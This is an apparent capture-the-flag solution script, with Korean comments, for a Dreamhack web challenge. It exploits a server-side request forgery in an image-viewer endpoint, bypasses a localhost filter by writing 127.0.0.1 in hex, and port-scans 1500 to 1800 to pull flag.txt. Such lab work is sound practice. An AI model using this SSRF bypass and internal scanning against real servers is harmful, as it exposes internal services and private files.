import base64
import requests
from requests_toolbelt import MultipartEncoder
from html.parser import HTMLParser

# 요청의 결과에서 이미지 데이터만 추출하는 HTML Parser Class
class Parser(HTMLParser):
    def __init__(self, *, convert_charrefs = True):
        super().__init__(convert_charrefs=convert_charrefs)
        self.img_b64 = ''

    def handle_starttag(self, tag, attrs):
        if tag == 'img':
            img = attrs[0][1]
            self.img_b64 = img[img.index(' ')+1:]

# 제공된 데이터를 Form Data로 묶어 POST 요청
def post(url, field_data):
    m = MultipartEncoder(fields=field_data)
    headers = {'Content-Type' : m.content_type}
    return requests.post(url, headers=headers, data=m)

# 요청의 결과에 해당하는 img 태그의 데이터를 추출
def getimg_b64(resp):
    parser = Parser()
    parser.feed(resp.text)
    return parser.img_b64

# 타겟 서버의 포트 후보군인 1500 ~ 1800에 대해 반복실행
for port in range(1500, 1801):
    # 해당 포트에서 flag.txt에 접근 시도
    resp = post('http://host8.dreamhack.games:22148/img_viewer', {
        # 127.0.0.1 -> 0x7f 0x00 0x00 0x01 -> 0x7f000001 
        'url': f'http://0x7f000001:{port}/flag.txt'
    })

    # base64 인코딩시, 그 결과의 길이는 원문의 1.3배(4/3배)로 알려져있음
    # 드림핵의 플래그 길이는 36bytes이므로,
    # 공격에 성공했다면 데이터의 길이는 48bytes일 것.
    img = getimg_b64(resp)
    if len(img) == 48:
        flag = base64.b64decode(img + '=' * (-len(img) % 4)).decode()
        print(f'Check PORT={port}! flag: {flag}')
